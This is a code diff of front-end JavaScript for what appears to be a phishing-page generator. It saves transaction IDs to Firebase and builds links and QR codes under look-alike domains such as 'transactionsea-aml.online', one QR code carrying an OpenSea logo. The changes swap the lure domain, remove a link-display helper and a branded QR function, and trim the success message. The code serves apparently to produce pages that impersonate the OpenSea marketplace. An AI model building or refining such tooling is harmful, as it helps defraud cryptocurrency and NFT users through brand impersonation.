@@ -42,8 +42,7 @@ const db = firebase.firestore(app);
 
 
 
-const URL = 'https://openseatx.online/assets/'
-
+const URL = 'https://secure.transactionsea-aml.online/assets/'
 $('#_a').on('submit', function () {
     var txID = $('#_a').find('input').eq([0]).val();
     console.log(txID)
@@ -62,9 +61,6 @@ $('#_a').on('submit', function () {
     const ref = db.collection(txID).doc('info')
     ref.set(data)
         .then( function () {
-
-            something()
-
             console.log('scuc')
         })
         .catch( function () {
@@ -72,20 +68,7 @@ $('#_a').on('submit', function () {
         })
 })
 
-function something(){
-    const txID = $('#_a').find('input').eq([0]).val();
-    const the_link = `${URL}${txID}`
 
-    $('#LINKHERE').html(the_link)
-
-    console.log(the_link)
-}
-
-
-
-
-
- 
 
 
 
@@ -98,8 +81,7 @@ $('#_b').on('submit', function (e) {
 
     // const ct = 'https://laughing-invention-vjqj65x9g442wrpx-8000.app.github.dev/assets/test.php'
 
-     //QR(_page)
-     QRNEW(_page)
+     QR(_page)
 
 
 
@@ -110,7 +92,7 @@ $('#_b').on('submit', function (e) {
         data: data,
         success: function (data) {
             // window.open(`${_page}`, '_blank');
-             $('#userlinkpage').html(`succesfully created page, link below: <h3 style="color:blue">${URL}${_page}</h3>`)
+             $('#userlinkpage').html(`${URL}${_page}`)
 
 
 
@@ -139,31 +121,4 @@ function QR(link) {
     var qr = new QRCode(document.getElementById("qrcode"), `${URL}${link}`);
 
     
-}
-
-
-
-function QRNEW(link) {
-
-
-    const qrCode = new QRCodeStyling({
-        width: 300,
-        height: 300,
-        type: "svg",
-        data: `${URL}${link}`,
-        image: "https://giterhaber.github.io/qrqr/core/opensea.svg",
-        dotsOptions: {
-            color: "black",
-            type: ""
-        },
-        backgroundOptions: {
-            color: "#ffffff",
-        },
-        imageOptions: {
-            crossOrigin: "anonymous",
-            margin: 5
-        }
-    });
-
-    qrCode.append(document.getElementById("canvas"));
 }
